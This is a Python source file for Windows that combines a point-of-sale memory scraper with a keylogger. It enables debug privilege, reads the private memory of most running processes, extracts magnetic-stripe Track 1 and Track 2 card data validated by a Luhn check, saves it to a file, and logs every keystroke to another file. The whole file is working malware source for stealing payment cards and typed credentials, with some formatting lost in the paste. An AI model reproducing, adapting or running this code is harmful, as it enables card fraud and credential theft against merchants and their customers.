import re import os import threading from time import sleep from datetime import datetime from ctypes import * from pynput import keyboard

# Windows API Setup

LPVOID = c_void_p HANDLE = LPVOID DWORD = c_uint32 WORD = c_uint16 UINT = c_uint LONG = c_long INVALID_HANDLE_VALUE = c_void_p(-1).value

TOKEN_ADJUST_PRIVILEGES = 0x00000020 TOKEN_QUERY = 0x0008 SE_PRIVILEGE_ENABLED = 0x00000002

PROCESS_VM_READ = 0x0010 PROCESS_VM_OPERATION = 0x0008 PROCESS_QUERY_INFORMATION = 0x0400

MEM_PRIVATE = 0x20000 MEM_COMMIT = 0x1000

PAGE_EXECUTE_READ = 0x20 PAGE_EXECUTE_READWRITE = 0x40 PAGE_READWRITE = 0x04

TH32CS_SNAPPROCESS = 0x00000002

LOG_FILE = os.path.join(os.getcwd(), "keylog_POS.txt") CARD_FILE = os.path.join(os.getcwd(), "found_cards.txt")

class LUID(Structure): fields = [("LowPart", DWORD), ("HighPart", LONG)]

class LUID_AND_ATTRIBUTES(Structure): fields = [("Luid", LUID), ("Attributes", DWORD)]

class TOKEN_PRIVILEGES(Structure): fields = [("PrivilegeCount", DWORD), ("Privileges", LUID_AND_ATTRIBUTES)]

class MEMORY_BASIC_INFORMATION(Structure): fields = [ ("BaseAddress", c_void_p), ("AllocationBase", c_void_p), ("AllocationProtect", DWORD), ("RegionSize", UINT), ("State", DWORD), ("Protect", DWORD), ("Type", DWORD) ]

class PROCESSENTRY32(Structure): fields = [ ("dwSize", c_ulong), ("cntUsage", c_ulong), ("th32ProcessID", c_ulong), ("th32DefaultHeapID", c_ulong), ("th32ModuleID", c_ulong), ("cntThreads", c_ulong), ("th32ParentProcessID", c_ulong), ("pcPriClassBase", c_ulong), ("dwFlags", c_ulong), ("szExeFile", c_char * 260) ]

# Privilege Enabling ------------------

def EnablePrivilege(privilegeStr, hToken=None): if hToken is None: hToken = HANDLE(INVALID_HANDLE_VALUE) if not windll.advapi32.OpenProcessToken( windll.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, byref(hToken)): print("[-] Failed to open process token") return False

privilege_id = LUID()
if not windll.advapi32.LookupPrivilegeValueA(None, privilegeStr.encode('ascii'), byref(privilege_id)):
    print("[-] LookupPrivilegeValueA failed")
    return False

laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
tp = TOKEN_PRIVILEGES(1, laa)

if not windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None):
    print("[-] AdjustTokenPrivileges failed")
    return False
return True

# Memory Scanner ------------------

def luhn_checksum(card_number): def digits_of(n): return [int(d) for d in str(n)] digits = digits_of(card_number) odd_sum = sum(digits[-1::-2]) even_sum = sum([sum(digits_of(d*2)) for d in digits[-2::-2]]) return (odd_sum + even_sum) % 10 == 0

def check_buffer(buffer): track1_pattern = re.compile(rb'%B(\d{13,19})^([^^]+)^(\d{4})(\d{3})([^?]+)?') track2_pattern = re.compile(rb';(\d{13,19})=(\d{4})(\d{3})([^?]+)?') found_tracks = []

for match in track1_pattern.finditer(buffer):
    pan = match.group(1).decode('ascii')
    if luhn_checksum(pan):
        track_data = match.group(0).decode('ascii')
        found_tracks.append(('Track 1', track_data, match.start()))

for match in track2_pattern.finditer(buffer):
    pan = match.group(1).decode('ascii')
    if luhn_checksum(pan):
        track_data = match.group(0).decode('ascii')
        found_tracks.append(('Track 2', track_data, match.start()))

return found_tracks if found_tracks else "Not Found"

def Processis64(hProcess): pis64 = c_bool() windll.kernel32.IsWow64Process(hProcess, byref(pis64)) return pis64.value

def scan_memory(): print("[+] Starting RAM scan...") readlimit = 100 * 4096 skip = ("System", "svchost.exe", "csrss.exe", "lsass.exe")

hSnap = windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
if hSnap == INVALID_HANDLE_VALUE:
    print("[-] Failed to create snapshot")
    return

pe32 = PROCESSENTRY32()
pe32.dwSize = sizeof(PROCESSENTRY32)
if not windll.kernel32.Process32First(hSnap, byref(pe32)):
    windll.kernel32.CloseHandle(hSnap)
    return

ownpid = windll.kernel32.GetCurrentProcessId()
with open(CARD_FILE, "w") as f:
    while True:
        name = pe32.szExeFile.decode('utf-8', errors='ignore')
        pid = pe32.th32ProcessID
        if name.lower() not in [x.lower() for x in skip] and pid != ownpid:
            hProcess = windll.kernel32.OpenProcess(
                PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
                0,
                pid
            )
            if not hProcess:
                if not windll.kernel32.Process32Next(hSnap, byref(pe32)):
                    break
                continue
            addr = c_long(0)
            while True:
                MBI = MEMORY_BASIC_INFORMATION()
                if not windll.kernel32.VirtualQueryEx(hProcess, addr.value, byref(MBI), sizeof(MBI)):
                    break
                if (addr.value != 0 and MBI.BaseAddress is None) or (MBI.AllocationBase is None and not Processis64(hProcess)):
                    break
                addr.value += MBI.RegionSize
                if MBI.Type == MEM_PRIVATE and MBI.State == MEM_COMMIT and MBI.Protect in (
                    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE):
                    ReadAddr = MBI.BaseAddress
                    BuffSize = min(MBI.RegionSize, readlimit)
                    Buff = create_string_buffer(BuffSize)
                    bytesRead = c_size_t(0)
                    if windll.kernel32.ReadProcessMemory(hProcess, ReadAddr, Buff, BuffSize, byref(bytesRead)):
                        found_cards = check_buffer(Buff.raw)
                        if found_cards != "Not Found":
                            for track_type, card, pos in found_cards:
                                addr_found = ReadAddr + pos
                                log = f"{track_type} | PID: {pid} | Process: {name} | Addr: {hex(addr_found)} | Data: {card}\n"
                                print(log.strip())
                                f.write(log)
                                f.flush()
            windll.kernel32.CloseHandle(hProcess)
        if not windll.kernel32.Process32Next(hSnap, byref(pe32)):
            break
windll.kernel32.CloseHandle(hSnap)
print("[+] RAM scan complete.")

# Keylogger ------------------

IGNORED_KEYS = { keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_r }

def format_key(key): if hasattr(key, 'char') and key.char: return key.char elif key == keyboard.Key.space: return ' ' else: return f'[{key.name}]' if hasattr(key, 'name') else f'[{key}]'

def on_press(key): if key in IGNORED_KEYS: return try: timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') key_str = format_key(key) with open(LOG_FILE, 'a', encoding='utf-8') as log_file: log_file.write(f"{timestamp} - {key_str}\n") except Exception as e: print(f"Logging error: {e}") if key == keyboard.Key.esc: return False

def keylogger_main(): print("[+] Keylogger started. Press ESC to stop.") with keyboard.Listener(on_press=on_press) as listener: listener.join()

# Entry Point ------------------

def run_all(): key_thread = threading.Thread(target=keylogger_main, daemon=True) key_thread.start()

if not EnablePrivilege('SeDebugPrivilege'):
    print("[-] Could not enable SeDebugPrivilege. Run as Administrator.")
else:
    scan_memory()

key_thread.join()

if name == "main": run_all()

